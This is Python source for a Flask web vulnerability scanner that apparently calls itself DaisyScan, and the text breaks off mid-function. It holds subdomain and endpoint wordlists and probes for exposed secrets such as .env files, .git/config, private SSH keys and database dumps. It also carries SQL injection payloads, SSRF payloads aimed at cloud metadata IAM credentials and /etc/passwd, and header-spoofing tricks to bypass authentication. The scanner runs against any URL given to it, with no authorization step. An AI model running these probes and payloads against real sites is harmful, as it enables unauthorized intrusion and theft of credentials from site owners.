from flask import Flask, render_template_string, request, jsonify
import requests
import json
import base64
import time
import socket
import re
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

COMMON_SUBDOMAINS = [
    'www','api','dev','staging','stage','test','beta','alpha','prod','production',
    'admin','administrator','portal','dashboard','control','manage','management',
    'mail','email','smtp','pop','imap','webmail','mx','mx1','mx2',
    'ftp','sftp','ssh','vpn','remote','rdp','gateway',
    'blog','shop','store','cdn','static','assets','media','img','images',
    'video','files','upload','uploads','downloads','content','data',
    'app','apps','mobile','m','wap','web','api2','api3',
    'secure','ssl','login','auth','oauth','sso','id','identity',
    'db','database','mysql','postgres','redis','mongo','elastic','search',
    'jenkins','ci','cd','git','gitlab','bitbucket','svn','repo',
    'jira','confluence','wiki','docs','documentation','help','support',
    'monitor','monitoring','metrics','grafana','kibana','prometheus','status',
    'api-dev','api-staging','api-test','api-prod','api-v1','api-v2',
    'backend','frontend','ws','socket','stream','push','events',
    'analytics','tracking','stats','reporting','reports',
    'payment','pay','checkout','billing','invoice','stripe','paypal',
    'helpdesk','ticket','service','crm','erp','hr',
    'news','feed','rss','newsletter','broadcast','notify',
    'sandbox','demo','preview','uat','qa','testing',
    'internal','intranet','corp','corporate','office','private',
    'old','legacy','archive','backup','bak','v1','v2','v3',
    'new','next','preview2','beta2','alpha2',
    'cloud','k8s','kubernetes','docker','registry','hub',
    'proxy','lb','loadbalancer','edge','relay','cache',
    'chat','messaging','notifications','sms','voice',
    'partner','partners','affiliate','b2b','wholesale',
    'sentry','datadog','newrelic','splunk','logstash',
    'smtp2','mail2','bounce','sendgrid','mailgun','ses',
    'artifactory','nexus','sonar','sonarqube',
    'phpmyadmin','pma','adminer','pgadmin','dbadmin',
    'server','host','vps','ns1','ns2','dns','dns1','dns2',
    'ovpn','wireguard','openvpn','vpn2',
    'cron','scheduler','worker','queue','jobs','tasks',
    'assets2','cdn2','media2','images2','static2',
    'webhook','hooks','callback','events2',
    'test1','test2','dev1','dev2','stage1','uat1',
    'crm2','admin2','portal2','panel','cp','cPanel',
]

SENSITIVE_PATHS = [
    ('.env',                           'Environment Variables',             'critical'),
    ('.env.local',                     'Local Environment Variables',       'critical'),
    ('.env.production',                'Production Environment Variables',  'critical'),
    ('.env.backup',                    'Environment Backup',                'critical'),
    ('.env.dev',                       'Dev Environment Variables',         'high'),
    ('.env.example',                   'Environment Example File',          'medium'),
    ('config.php',                     'PHP Config File',                   'high'),
    ('config.yml',                     'YAML Config File',                  'high'),
    ('config.yaml',                    'YAML Config File',                  'high'),
    ('config.json',                    'JSON Config File',                  'high'),
    ('configuration.php',              'PHP Configuration',                 'high'),
    ('settings.php',                   'PHP Settings',                      'high'),
    ('settings.py',                    'Python Settings',                   'high'),
    ('local_settings.py',              'Local Python Settings',             'high'),
    ('.git/HEAD',                      'Git Repository HEAD',               'critical'),
    ('.git/config',                    'Git Config (remote URL + credentials)','critical'),
    ('.git/COMMIT_EDITMSG',            'Git Last Commit Message',           'medium'),
    ('.git/logs/HEAD',                 'Git Commit Log History',            'high'),
    ('.gitignore',                     'Git Ignore (path disclosure)',       'low'),
    ('database.sql',                   'Raw Database Dump',                 'critical'),
    ('db.sql',                         'Raw Database Dump',                 'critical'),
    ('backup.sql',                     'Database Backup Dump',              'critical'),
    ('dump.sql',                       'Database Dump',                     'critical'),
    ('data.sql',                       'Database Data Dump',                'critical'),
    ('.htpasswd',                      'Apache Password File',              'critical'),
    ('.htaccess',                      'Apache Access Control Config',      'medium'),
    ('wp-config.php',                  'WordPress Config (DB creds)',       'critical'),
    ('phpinfo.php',                    'PHP Info Page',                     'high'),
    ('info.php',                       'PHP Info Page',                     'high'),
    ('test.php',                       'PHP Test File',                     'medium'),
    ('debug.php',                      'PHP Debug File',                    'high'),
    ('id_rsa',                         'RSA Private Key',                   'critical'),
    ('.ssh/id_rsa',                    'SSH RSA Private Key',               'critical'),
    ('.ssh/authorized_keys',           'SSH Authorized Keys',               'high'),
    ('id_ed25519',                     'Ed25519 Private Key',               'critical'),
    ('.bash_history',                  'Bash Command History',              'high'),
    ('swagger.json',                   'Swagger API Docs (full endpoint map)','high'),
    ('openapi.json',                   'OpenAPI Spec',                      'high'),
    ('openapi.yaml',                   'OpenAPI YAML Spec',                 'high'),
    ('swagger.yaml',                   'Swagger YAML Docs',                 'high'),
    ('api-docs',                       'API Documentation Page',            'medium'),
    ('package.json',                   'Node.js Package (dep disclosure)',  'low'),
    ('composer.json',                  'PHP Composer (dep disclosure)',     'low'),
    ('requirements.txt',               'Python Dependencies',               'low'),
    ('Gemfile',                        'Ruby Dependencies',                 'low'),
    ('Pipfile',                        'Python Pipfile',                    'low'),
    ('dockerfile',                     'Dockerfile',                        'medium'),
    ('docker-compose.yml',             'Docker Compose Config',             'high'),
    ('docker-compose.yaml',            'Docker Compose Config',             'high'),
    ('server.key',                     'SSL Server Private Key',            'critical'),
    ('server.pem',                     'SSL Certificate PEM',               'high'),
    ('ca.crt',                         'CA Certificate',                    'medium'),
    ('ssl.key',                        'SSL Private Key',                   'critical'),
    ('web.config',                     'IIS Web Config',                    'high'),
    ('backup.zip',                     'Site Backup Archive',               'critical'),
    ('backup.tar.gz',                  'Site Backup TAR',                   'critical'),
    ('site.tar.gz',                    'Site Archive',                      'critical'),
    ('www.zip',                        'Web Root Archive',                  'critical'),
    ('error.log',                      'Error Log (info disclosure)',       'medium'),
    ('access.log',                     'Access Log',                        'medium'),
    ('debug.log',                      'Debug Log',                         'medium'),
    ('phpmyadmin/',                    'phpMyAdmin Panel',                  'high'),
    ('adminer.php',                    'Adminer Database UI',               'high'),
    ('pma/',                           'phpMyAdmin Alias',                  'high'),
    ('shell.php',                      'Web Shell (CRITICAL)',               'critical'),
    ('cmd.php',                        'Command Shell (CRITICAL)',           'critical'),
    ('c99.php',                        'c99 Web Shell',                     'critical'),
    ('r57.php',                        'r57 Web Shell',                     'critical'),
    ('webshell.php',                   'Web Shell',                         'critical'),
    ('.DS_Store',                      'macOS Dir Metadata (path disclosure)','low'),
    ('storage/logs/laravel.log',       'Laravel Application Log',           'medium'),
    ('storage/.env',                   'Laravel Environment Variables',     'critical'),
    ('app/etc/local.xml',              'Magento Local Config',              'critical'),
    ('WEB-INF/web.xml',                'Java Deployment Descriptor',        'high'),
    ('server-status',                  'Apache Server Status',              'medium'),
    ('server-info',                    'Apache Server Info',                'medium'),
    ('config/database.yml',            'Rails Database Config',             'critical'),
    ('config/secrets.yml',             'Rails Secrets',                     'critical'),
    ('config/master.key',              'Rails Master Key',                  'critical'),
    ('terraform.tfstate',              'Terraform State (may have secrets)','critical'),
    ('terraform.tfvars',               'Terraform Variables',               'high'),
    ('.travis.yml',                    'Travis CI Config',                  'low'),
    ('Jenkinsfile',                    'Jenkins Pipeline Config',           'medium'),
    ('sonar-project.properties',       'SonarQube Config',                  'low'),
    ('xmlrpc.php',                     'WordPress XMLRPC (DDoS risk)',      'medium'),
    ('crossdomain.xml',                'Flash Cross-Domain Policy',         'low'),
    ('.well-known/security.txt',       'Security Contact Info',             'info'),
    ('robots.txt',                     'Robots.txt (may disclose paths)',   'info'),
    ('sitemap.xml',                    'Sitemap (may disclose paths)',      'info'),
]

CONTENT_VALIDATORS = {
    '.env':               lambda t: bool(re.search(r'[A-Z_]{2,}=.+', t)),
    '.env.local':         lambda t: bool(re.search(r'[A-Z_]{2,}=', t)),
    '.env.production':    lambda t: bool(re.search(r'[A-Z_]{2,}=', t)),
    '.env.backup':        lambda t: bool(re.search(r'[A-Z_]{2,}=', t)),
    '.env.dev':           lambda t: bool(re.search(r'[A-Z_]{2,}=', t)),
    '.env.example':       lambda t: bool(re.search(r'[A-Z_]+=', t)),
    '.git/HEAD':          lambda t: bool(re.match(r'^(ref: refs/|[0-9a-f]{40})', t.strip())),
    '.git/config':        lambda t: '[core]' in t or '[remote' in t,
    '.git/COMMIT_EDITMSG':lambda t: len(t.strip()) > 2 and len(t) < 5000,
    '.git/logs/HEAD':     lambda t: bool(re.search(r'[0-9a-f]{40}', t)),
    'wp-config.php':      lambda t: 'DB_NAME' in t or 'DB_PASSWORD' in t,
    'config.php':         lambda t: bool(re.search(r'(password|db_|database|secret|key)', t, re.I)),
    'phpinfo.php':        lambda t: 'PHP Version' in t or 'phpinfo()' in t.lower(),
    'info.php':           lambda t: 'PHP Version' in t,
    'id_rsa':             lambda t: '-----BEGIN' in t and ('RSA' in t or 'PRIVATE' in t),
    '.ssh/id_rsa':        lambda t: '-----BEGIN' in t and 'PRIVATE' in t,
    'id_ed25519':         lambda t: '-----BEGIN' in t and 'PRIVATE' in t,
    '.bash_history':      lambda t: bool(re.search(r'(sudo|ssh|mysql|psql|wget|curl|chmod|export|passwd)', t)),
    '.htpasswd':          lambda t: bool(re.search(r'\w+:(\$apr1\$|\$2y\$|\{SHA\}|[a-zA-Z0-9./]{13})', t)),
    'database.sql':       lambda t: bool(re.search(r'(CREATE TABLE|INSERT INTO|DROP TABLE|CREATE DATABASE)', t, re.I)),
    'db.sql':             lambda t: bool(re.search(r'(CREATE TABLE|INSERT INTO|DROP TABLE)', t, re.I)),
    'backup.sql':         lambda t: bool(re.search(r'(CREATE TABLE|INSERT INTO|DROP TABLE)', t, re.I)),
    'dump.sql':           lambda t: bool(re.search(r'(CREATE TABLE|INSERT INTO|DROP TABLE)', t, re.I)),
    'swagger.json':       lambda t: bool(re.search(r'"(swagger|openapi)"', t)),
    'openapi.json':       lambda t: bool(re.search(r'"(swagger|openapi)"', t)),
    'package.json':       lambda t: '"name"' in t and '"version"' in t,
    'composer.json':      lambda t: '"require"' in t or '"name"' in t,
    'requirements.txt':   lambda t: bool(re.search(r'^[a-zA-Z][\w\-]+(==|>=|<=|~=)', t, re.M)),
    'server.key':         lambda t: '-----BEGIN' in t and 'KEY' in t,
    'ssl.key':            lambda t: '-----BEGIN' in t and 'KEY' in t,
    'terraform.tfstate':  lambda t: '"terraform_version"' in t or '"resources"' in t,
    'terraform.tfvars':   lambda t: bool(re.search(r'[\w_]+\s*=\s*"', t)),
    'config/database.yml':lambda t: bool(re.search(r'(password|database|host|username)', t, re.I)),
    'config/secrets.yml': lambda t: bool(re.search(r'(secret|key|token)', t, re.I)),
    'config/master.key':  lambda t: len(t.strip()) > 20 and bool(re.match(r'^[a-f0-9]+$', t.strip())),
    'error.log':          lambda t: bool(re.search(r'(error|exception|fatal|warning)', t, re.I)) and len(t) > 50,
    'shell.php':          lambda t: True,
    'cmd.php':            lambda t: True,
    'c99.php':            lambda t: True,
    'r57.php':            lambda t: True,
    'webshell.php':       lambda t: True,
    'docker-compose.yml': lambda t: 'services:' in t or 'image:' in t,
    'docker-compose.yaml':lambda t: 'services:' in t or 'image:' in t,
}

COMMON_ENDPOINTS = [
    '/api','/api/v1','/api/v2','/api/v3','/api/v4','/api/v5',
    '/admin','/admin/login','/admin/dashboard','/administrator','/admin/index.php',
    '/dashboard','/panel','/control','/cp','/controlpanel',
    '/login','/signin','/signup','/register','/auth','/auth/login','/auth/token',
    '/graphql','/graphiql','/api/graphql','/playground','/query',
    '/gateway','/api-gateway','/microservice','/services','/service',
    '/api/users','/api/user','/api/admin','/api/config','/api/me','/api/profile',
    '/api/keys','/api/tokens','/api/secret','/api/internal','/api/private',
    '/health','/status','/metrics','/actuator','/monitor','/ping',
    '/actuator/health','/actuator/env','/actuator/beans','/actuator/mappings',
    '/actuator/logfile','/actuator/heapdump','/actuator/threaddump',
    '/actuator/info','/actuator/httptrace','/actuator/scheduledtasks',
    '/debug','/test','/dev','/development','/staging','/trace',
    '/console','/shell','/terminal','/command','/cmd',
    '/swagger','/swagger-ui','/swagger-ui.html','/swagger/index.html',
    '/api-docs','/docs','/documentation','/redoc',
    '/internal','/private','/secret','/hidden','/management',
    '/backup','/bak','/old','/archive','/tmp',
    '/upload','/uploads','/files','/media','/static','/assets',
    '/env','/config','/settings','/setup','/install','/configure',
    '/phpinfo','/info','/version','/changelog','/readme',
    '/.well-known/security.txt','/server-status','/server-info',
    '/jenkins','/gitlab','/sonar','/jira','/confluence',
    '/kibana','/grafana','/prometheus','/elasticsearch','/mongo',
    '/v1','/v2','/v3','/rest','/restapi','/api/rest',
    '/api/auth','/api/login','/api/token','/api/refresh','/api/jwt',
    '/api/search','/api/data','/api/export','/api/import',
    '/api/admin/users','/api/admin/config','/api/admin/settings',
    '/wp-admin','/wp-login.php','/xmlrpc.php','/wp-json','/wp-json/wp/v2',
    '/phpmyadmin','/pma','/adminer','/pgadmin',
    '/_cat','/cat/indices','/cat/nodes','/_cluster/health','/_nodes',
    '/solr','/solr/admin','/solr/select',
    '/manager','/manager/html','/host-manager',
    '/__admin','/api/__admin',
    '/api/swagger','/api/openapi',
    '/api/v1/users','/api/v1/admin','/api/v1/config',
    '/api/v2/users','/api/v2/admin',
    '/oauth','/oauth2','/oauth/token','/oauth/authorize',
    '/openid','/connect','/saml',
    '/webhook','/webhooks','/hooks','/callback',
    '/cron','/scheduler','/jobs','/worker','/queue',
    '/.git/HEAD','/sitemap.xml','/robots.txt',
    '/crossdomain.xml','/clientaccesspolicy.xml',
    '/elmah.axd','/trace.axd','/web.config',
    '/rails/info/properties','/rails/mailers',
    '/__webpack_hmr','/webpack-dev-server',
    '/socket.io','/socket.io/',
    '/ws','/wss',
]

SQLI_PAYLOADS = [
    ("'",                                             'syntax'),
    ("''",                                            'syntax'),
    ('"',                                             'syntax'),
    ("1 AND 1=1",                                     'boolean_true'),
    ("1 AND 1=2",                                     'boolean_false'),
    ("1' AND '1'='1",                                 'boolean_true_str'),
    ("1' AND '1'='2",                                 'boolean_false_str'),
    ("' OR '1'='1'--",                                'or_bypass'),
    ("' OR 1=1--",                                    'or_numeric'),
    ("admin'--",                                      'comment'),
    ("1' AND SLEEP(5)--",                             'time_mysql'),
    ("1); WAITFOR DELAY '0:0:5'--",                   'time_mssql'),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",   'time_subq'),
    ("1 AND 1=1 UNION SELECT NULL--",                 'union_1'),
    ("' UNION SELECT NULL,NULL--",                    'union_2'),
    ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", 'error_mssql'),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", 'error_mysql'),
]

SSRF_PAYLOADS = [
    ('http://169.254.169.254/latest/meta-data/',                'AWS IMDSv1 Root'),
    ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Creds'),
    ('http://169.254.169.254/latest/user-data/',                'AWS UserData'),
    ('http://metadata.google.internal/computeMetadata/v1/',     'GCP Metadata'),
    ('http://169.254.169.254/metadata/v1/',                     'DigitalOcean Meta'),
    ('http://100.100.100.200/latest/meta-data/',                'Alibaba Cloud Meta'),
    ('http://localhost',                                         'Localhost'),
    ('http://127.0.0.1',                                        'Loopback IPv4'),
    ('http://[::1]',                                             'Loopback IPv6'),
    ('http://0.0.0.0',                                          'Zero Address'),
    ('http://127.0.0.1:22',                                     'SSH Port Probe'),
    ('http://127.0.0.1:3306',                                   'MySQL Port Probe'),
    ('http://127.0.0.1:5432',                                   'PostgreSQL Port Probe'),
    ('http://127.0.0.1:6379',                                   'Redis Port Probe'),
    ('http://127.0.0.1:27017',                                  'MongoDB Port Probe'),
    ('http://127.0.0.1:9200',                                   'ElasticSearch Port Probe'),
    ('file:///etc/passwd',                                       'LFI via file://'),
    ('file:///etc/hosts',                                        'Hosts File'),
    ('file:///proc/self/environ',                                'Proc Environ'),
    ('dict://localhost:11211/stat',                              'Memcached DICT'),
    ('http://2130706433',                                        'Decimal IP 127.0.0.1'),
    ('http://0x7f000001',                                        'Hex IP 127.0.0.1'),
]

AUTH_BYPASS_HEADERS = {
    'X-Original-URL':           '/admin',
    'X-Forwarded-For':          '127.0.0.1',
    'X-Remote-IP':              '127.0.0.1',
    'X-Client-IP':              '127.0.0.1',
    'X-Real-IP':                '127.0.0.1',
    'X-Custom-IP-Authorization':'127.0.0.1',
    'X-Originating-IP':         '127.0.0.1',
    'X-Host':                   'localhost',
    'X-Forwarded-Host':         'localhost',
    'X-ProxyUser-Ip':           '127.0.0.1',
    'True-Client-IP':           '127.0.0.1',
    'Cluster-Client-IP':        '127.0.0.1',
    'X-Forwarded-Server':       'localhost',
    'X-HTTP-Host-Override':     'localhost',
    'Forwarded':                'for=127.0.0.1;host=localhost',
}

WAF_SIGNATURES = {
    'Cloudflare':   ['cf-ray','cf-cache-status','cloudflare','__cfduid','cf-request-id'],
    'AWS WAF':      ['x-amzn-requestid','x-amzn-trace-id','awselb','x-amz-cf-id','x-amzn-errortype'],
    'Akamai':       ['akamai-cache','x-akamai-request-id','x-akamai-transformed','x-check-cacheable'],
    'Sucuri':       ['x-sucuri-id','x-sucuri-cache','sucuri'],
    'Imperva':      ['x-iinfo','incapsula','visid_incap','incap_ses'],
    'ModSecurity':  ['mod_security','modsecurity','x-modsec-action'],
    'F5 BigIP':     ['bigipserver','f5-trafficshield','bigipcookie','f5_cspm'],
    'Barracuda':    ['barra_counter_session','barracuda_ceess'],
    'Fastly':       ['fastly-io-info','x-fastly-request-id','x-served-by'],
    'Varnish':      ['x-varnish','via: varnish','x-hits'],
    'Nginx':        ['server: nginx'],
    'Apache':       ['server: apache'],
    'IIS':          ['server: microsoft-iis','x-aspnet-version','x-powered-by: asp.net'],
}

TECH_SIGNATURES = {
    'WordPress':   ['wp-content','wp-includes','wp-json','wp-embed'],
    'Drupal':      ['drupal','drupal.js','x-generator: drupal','drupal.settings'],
    'Joomla':      ['joomla','/components/com_','joomla!'],
    'Laravel':     ['laravel','xsrf-token','laravel_session','x-powered-by: php'],
    'Django':      ['csrftoken','django-debug-toolbar','x-frame-options: deny'],
    'Express.js':  ['x-powered-by: express'],
    'Ruby on Rails':['x-runtime','_session_id','x-request-id','x-content-type-options'],
    'Spring Boot': ['x-application-context','whitelabel error','spring'],
    'ASP.NET':     ['__viewstate','x-aspnet-version','.aspx','x-aspnetmvc-version'],
    'Angular':     ['ng-version','__ngcontext'],
    'React':       ['__react','data-reactroot','_reactfiber','react'],
    'Vue.js':      ['__vue__','nuxt','vue-meta'],
    'Next.js':     ['x-powered-by: next.js','__next_data','_next'],
    'jQuery':      ['jquery','jquery.min.js'],
    'PHP':         ['x-powered-by: php'],
    'Python':      ['werkzeug','gunicorn','uvicorn','x-powered-by: python'],
    'Java':        ['jsessionid','java','servlet'],
    'Node.js':     ['x-powered-by: express','node.js'],
    'ElasticSearch':['x-elastic-product'],
    'GraphQL':     ['content-type: application/graphql'],
}

SQLI_ERROR_PATTERNS = [
    r'mysql_fetch', r'mysql_num_rows', r'pg_query', r'sqlite_',
    r'sql syntax', r'quoted string not properly terminated',
    r'odbc driver', r'oledb', r'microsoft ole db',
    r'invalid query', r'mysql error', r'oracle error',
    r'sqlite error', r'postgresql error', r'pdo.*exception',
    r'warning: pg_', r'warning: mysql_',
    r'ora-\d{4,5}', r'db2 sql error', r'com\.mysql\.jdbc',
    r'sqlexception', r'pdoexception', r'syntax error.*query',
    r'you have an error in your sql', r'division by zero',
    r'supplied argument is not a valid mysql',
    r'unclosed quotation mark', r'unterminated string literal',
    r'column.*does not exist', r'table.*doesn\'t exist',
    r'invalid column name', r'ambiguous column name',
    r'operand should contain', r'incorrect integer value',
]

SSRF_CONFIRM_PATTERNS = [
    r'ami-id', r'instance-id', r'availability-zone', r'security-credentials',
    r'computemetadata', r'project-id', r'numeric-project-id', r'service-accounts',
    r'root:.*:/bin/', r'daemon:.*:/usr/sbin/',
    r'host:\s*(localhost|127\.0\.0\.1)', r'\[core\]', r'ssh-rsa AAAA',
    r'redis_version', r'connected_clients', r'used_memory',
    r'mysql.*connected', r'postgresql.*connected',
    r'\{"status":\s*"green"', r'\{"cluster_name"',
]


def make_request(url, method='GET', headers=None, timeout=9, allow_redirects=True, params=None, data=None):
    base_hdrs = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 DaisyScan/2.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    if headers:
        base_hdrs.update(headers)
    try:
        return requests.request(
            method, url,
            headers=base_hdrs, timeout=timeout,
            verify=False, allow_redirects=allow_redirects,
            params=params, data=data,
        )
    except Exception:
        return None


def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def extract_base_domain(url):
    parsed = urlparse(normalize_url(url))
    host = parsed.hostname or ''
    parts = host.split('.')
    if len(parts) >= 2:
        return '.'.join(parts[-2:])
    return host


def validate_domain(url):
    url = normalize_url(url)
    parsed = urlparse(url)
    hostname = parsed.hostname
    if not hostname:
        return False, 'Invalid URL — no hostname found'
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        return False, f'DNS resolution failed for {hostname} — domain does not exist or is unreachable'
    try:
        resp = make_request(url, timeout=10)
        if resp is None:
            return False, f'Domain resolves to {ip} but HTTP connection failed'
        return True, f'Online — IP: {ip}, HTTP {resp.status_code}'
    except Exception as e:
        return False, f'Connection error: {str(e)}'


def get_404_baseline(base_url):
    rnd = ''.join(random.choices(string.ascii_lowercase, k=14))
    paths = [f'/{rnd}', f'/{rnd}.php', f'/{rnd}.html']
    sizes = []
    snippets = []
    for p in paths:
        r = make_request(base_url + p, timeout=7)
        if r:
            sizes.append(len(r.content))
            snippets.append(r.text[:300] if r.text else '')
    return sizes, snippets


def is_false_positive(resp_content, resp_size, baseline_sizes, baseline_snippets):
    if not baseline_sizes:
        return False
    for bl_size in baseline_sizes:
        if abs(resp_size - bl_size) < 150:
            return True
    if resp_size < 50:
        return True
    resp_text_low = resp_content.lower() if resp_content else ''
    for snip in baseline_snippets:
        if snip and len(snip) > 30:
            snip_words = set(snip.lower().split())
            resp_words = set(resp_text_low.split())
            overlap = snip_words & resp_words
            if len(snip_words) > 0 and len(overlap) / len(snip_words) > 0.75:
                return True
    fp_patterns = [
        r'page not found', r'404', r'not found', r'doesn\'t exist',
        r'no page found', r'does not exist', r'oops',
        r'nothing here', r'error 404', r'this page is missing',
    ]
    for pat in fp_patterns:
        if re.search(pat, resp_text_low):
            return True
    return False


def validate_file_content(path_key, text, size):
    if size < 10:
        return False
    ct_type_mismatch_phrases = [
        'page not found', '404 not found', "can't be found",
        'doesn\'t exist', 'no page found', 'nothing here',
        'error 404', 'oops', 'this page is missing',
    ]
    text_low = text.lower() if text else ''
    for phrase in ct_type_mismatch_phrases:
        if phrase in text_low:
            return False
    validator = CONTENT_VALIDATORS.get(path_key)
    if validator:
        try:
            return validator(text)
        except Exception:
            return False
    return True


def detect_waf(headers, body):
    found = set()
    hdrs_str = str(dict(headers)).lower()
    body_low = (body or '').lower()[:3000]
    for waf, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            if sig.lower() in hdrs_str or sig.lower() in body_low:
                found.add(waf)
                break
    return list(found)


def detect_tech(headers, body):
    found = set()
    hdrs_str = str(dict(headers)).lower()
    body_low = (body or '').lower()[:8000]
    for tech, sigs in TECH_SIGNATURES.items():
        for sig in sigs:
            if sig.lower() in hdrs_str or sig.lower() in body_low:
                found.add(tech)
                break
    return list(found)


def check_subdomain_alive(subdomain, base_domain):
    hostname = f'{subdomain}.{base_domain}'
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        return None
    for scheme in ['https', 'http']:
        url = f'{scheme}://{hostname}'
        resp = make_request(url, timeout=7, allow_redirects=True)
        if resp:
            return {
                'subdomain': subdomain,
                'hostname': hostname,
                'ip': ip,
                'url': url,
                'status': resp.status_code,
                'server': resp.headers.get('Server', ''),
                'title': re.search(r'<title[^>]*>([^<]{1,80})</title>', resp.text or '', re.I | re.S),
                'size': len(resp.content),
                'tech': detect_tech(resp.headers, resp.text[:3000]),
            }
    return None


@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route('/api/validate', methods=['POST'])
def api_validate():
    data = request.json
    url = (data.get('url') or '').strip()
    if not url:
        return jsonify({'valid': False, 'message': 'No URL provided'})
    ok, msg = validate_domain(url)
    return jsonify({'valid': ok, 'message': msg})


@app.route('/api/recon', methods=['POST'])
def api_recon():
    data = request.json
    url = normalize_url(data.get('url', ''))
    if not url:
        return jsonify({'error': 'URL required'}), 400
    ok, valmsg = validate_domain(url)
    if not ok:
        return jsonify({'error': valmsg}), 400

    result = {
        'url': url, 'status': None, 'server': None,
        'headers': {}, 'technologies': [], 'waf': [],
        'security_headers': {}, 'dns': {}, 'ssl': {},
        'redirects': [], 'interesting': [], 'validate_msg': valmsg,
    }

    resp = make_request(url, allow_redirects=True)
    if not resp:
        return jsonify({'error': 'Cannot connect to target'}), 400

    result['status'] = resp.status_code
    result['headers'] = dict(resp.headers)
    result['server'] = resp.headers.get('Server', 'Unknown')
    result['technologies'] = detect_tech(resp.headers, resp.text[:8000])
    result['waf'] = detect_waf(resp.headers, resp.text[:3000])

    sec_hdrs = [
        'Strict-Transport-Security','Content-Security-Policy',
        'X-Frame-Options','X-Content-Type-Options','X-XSS-Protection',
        'Referrer-Policy','Permissions-Policy','Cross-Origin-Opener-Policy',
        'Cross-Origin-Resource-Policy','Cross-Origin-Embedder-Policy',
    ]
    for hdr in sec_hdrs:
        val = resp.headers.get(hdr)
        result['security_headers'][hdr] = val if val else 'MISSING'

    parsed = urlparse(url)
    hostname = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(hostname)
        result['dns']['ip'] = ip
        try:
            result['dns']['hostname'] = socket.gethostbyaddr(ip)[0]
        except Exception:
            result['dns']['hostname'] = 'N/A'
        try:
            all_ips = socket.getaddrinfo(hostname, None)
            unique_ips = list(set(a[4][0] for a in all_ips))
            result['dns']['all_ips'] = unique_ips
        except Exception:
            result['dns']['all_ips'] = [ip]
    except Exception:
        result['dns']['ip'] = 'Failed'

    if parsed.scheme == 'https':
        try:
            import ssl as sslm
            ctx = sslm.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = sslm.CERT_NONE
            conn = ctx.wrap_socket(socket.socket(), server_hostname=hostname)
            conn.settimeout(5)
            conn.connect((hostname, 443))
            cert = conn.getpeercert()
            conn.close()
            if cert:
                result['ssl']['subject'] = dict(x[0] for x in cert.get('subject', []))
                result['ssl']['issuer'] = dict(x[0] for x in cert.get('issuer', []))
                result['ssl']['notBefore'] = cert.get('notBefore', '')
                result['ssl']['notAfter'] = cert.get('notAfter', '')
                sans = cert.get('subjectAltName', [])
                result['ssl']['san'] = [v for t, v in sans if t == 'DNS']
        except Exception as e:
            result['ssl']['error'] = str(e)

    if resp.history:
        for r in resp.history:
            result['redirects'].append({'url': r.url, 'status': r.status_code})

    disclosure = [
        ('X-Powered-By', 'Technology disclosure'),
        ('Server', 'Server version disclosure'),
        ('X-Generator', 'Generator disclosure'),
        ('X-Drupal-Cache', 'Drupal detected'),
        ('X-AspNet-Version', 'ASP.NET version leaked'),
        ('X-AspNetMvc-Version', 'ASP.NET MVC version leaked'),
        ('X-Runtime', 'Ruby on Rails runtime exposed'),
        ('X-Application-Context', 'Spring Boot context exposed'),
    ]
    for hdr, note in disclosure:
        if hdr in resp.headers:
            result['interesting'].append(f'{note}: {resp.headers[hdr]}')

    title_m = re.search(r'<title[^>]*>([^<]{1,120})</title>', resp.text or '', re.I | re.S)
    if title_m:
        result['interesting'].append(f'Page title: {title_m.group(1).strip()}')

    robots = make_request(urljoin(url, '/robots.txt'), timeout=6)
    if robots and robots.status_code == 200 and 'text' in robots.headers.get('Content-Type', ''):
        disallowed = [
            line.split(':', 1)[1].strip()
            for line in robots.text.splitlines()
            if line.lower().startswith('disallow:') and line.split(':', 1)[1].strip()
        ]
        if disallowed:
            result['interesting'].append(f'robots.txt disallowed: {", ".join(disallowed[:8])}')

    sitemap = make_request(urljoin(url, '/sitemap.xml'), timeout=6)
    if sitemap and sitemap.status_code == 200:
        result['interesting'].append(f'sitemap.xml found ({len(sitemap.content)} bytes)')

    return jsonify(result)


@app.route('/api/sensitive-files', methods=['POST'])
def api_sensitive_files():
    data = request.json
    url = normalize_url(data.get('url', ''))
    if not url:
        return jsonify({'error': 'URL required'}), 400
    ok, valmsg = validate_domain(url)
    if not ok:
        return jsonify({'error': valmsg}), 400

    baseline_sizes, baseline_snippets = get_404_baseline(url)

    confirmed = []
    suspicious = []
    forbidden = []

    def check_path(entry):
        path, label, severity = entry
        full_url = url.rstrip('/') + '/' + path.lstrip('/')
        resp = make_request(full_url, timeout=9, allow_redirects=False)
        if not resp:
            return
        if resp.status_code in (200, 206):
            content_type = resp.headers.get('Content-Type', '')
            size = len(resp.content)
            text = ''
            if any(x in content_type for x in ['text', 'json', 'xml', 'javascript', 'yaml', 'x-sh']):
                text = resp.text[:1000]
            if is_false_positive(text or '', size, baseline_sizes, baseline_snippets):
                return
            path_key = path.split('/')[-1] if '/' in path else path
            valid = validate_file_content(path_key, text, size)
            entry_data = {
                'path': path, 'url': full_url, 'label': label,
                'severity': severity, 'status': resp.status_code,
                'size': size, 'content_type': content_type.split(';')[0],
                'snippet': text[:300].strip(),
            }
            if valid:
                confirmed.append(entry_data)
            else:
                entry_data['note'] = 'Content does not match expected pattern — manual verification required'
                suspicious.append(entry_data)

        elif resp.status_code == 403:
            forbidden.append({
                'path': path, 'url': full_url, 'label': label,
                'severity': 'medium', 'status': 403,
                'note': 'Access denied — resource may exist, test with different methods/headers',
            })
        elif resp.status_code == 401:
            forbidden.append({
                'path': path, 'url': full_url, 'label': label,
